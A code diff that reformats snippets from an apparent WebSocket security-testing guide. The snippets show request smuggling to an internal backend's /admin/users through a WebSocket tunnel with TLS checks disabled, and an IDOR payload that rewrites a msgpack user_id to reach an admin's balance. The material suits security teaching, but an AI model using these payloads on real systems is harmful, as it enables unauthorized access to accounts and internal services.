@@ -266,16 +266,14 @@ import websocket
 import ssl
 
 ws = websocket.create_connection(
-    'wss://target.com/ws',
-    header=['Origin: https://target.com'],
-    sslopt={"cert_reqs": ssl.CERT_NONE}
+    "wss://target.com/ws",
+    header=["Origin: https://target.com"],
+    sslopt={"cert_reqs": ssl.CERT_NONE},
 )
 
 # After upgrade, send raw HTTP through the tunnel
 smuggled_request = (
-    b"GET /admin/users HTTP/1.1\r\n"
-    b"Host: internal-backend\r\n"
-    b"Connection: close\r\n\r\n"
+    b"GET /admin/users HTTP/1.1\r\nHost: internal-backend\r\nConnection: close\r\n\r\n"
 )
 ws.send(smuggled_request, opcode=0x2)  # binary frame
 response = ws.recv()
@@ -417,7 +415,7 @@ echo "CAPTURED_HEX" | xxd -r -p | protoc --decode_raw
 import msgpack
 import websocket
 
-ws = websocket.create_connection('wss://target.com/ws')
+ws = websocket.create_connection("wss://target.com/ws")
 
 # Decode received binary message
 raw = ws.recv()
@@ -425,7 +423,7 @@ data = msgpack.unpackb(raw, raw=False)
 # data = {'action': 'get_balance', 'user_id': 123}
 
 # Modify and re-send
-data['user_id'] = 1  # IDOR: access admin's balance
+data["user_id"] = 1  # IDOR: access admin's balance
 ws.send(msgpack.packb(data), opcode=0x2)
 ```
 
